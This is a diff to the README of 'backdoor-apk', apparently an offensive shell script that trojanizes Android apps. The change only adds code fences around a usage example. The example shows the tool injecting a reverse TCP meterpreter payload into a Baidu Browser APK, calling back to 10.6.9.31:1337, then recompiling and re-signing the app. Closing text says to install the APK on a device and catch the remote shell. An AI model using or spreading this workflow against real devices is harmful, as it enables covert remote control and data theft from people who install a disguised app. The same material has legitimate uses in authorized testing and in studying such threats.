@@ -3,6 +3,7 @@ backdoor-apk is a shell script that simplifies the process of adding a backdoor 
 
 Usage:
 
+```
 root@kali:~/Android/evol-lab/BaiduBrowserRat# ./backdoor-apk.sh BaiduBrowser.apk 
 [*] Generating reverse tcp meterpreter payload...done.
 [+] Handle the meterpreter connection at: 10.6.9.31:1337
@@ -18,5 +19,6 @@ root@kali:~/Android/evol-lab/BaiduBrowserRat# ./backdoor-apk.sh BaiduBrowser.apk
 [*] Recompiling original project with backdoor...done.
 [*] Signing recompiled APK...done.
 root@kali:~/Android/evol-lab/BaiduBrowserRat#
+```
 
 The recompiled APK will be found in the 'original/dist' directory. Install the APK on an Android device and handle the meterpreter connection at the specified IP and port.
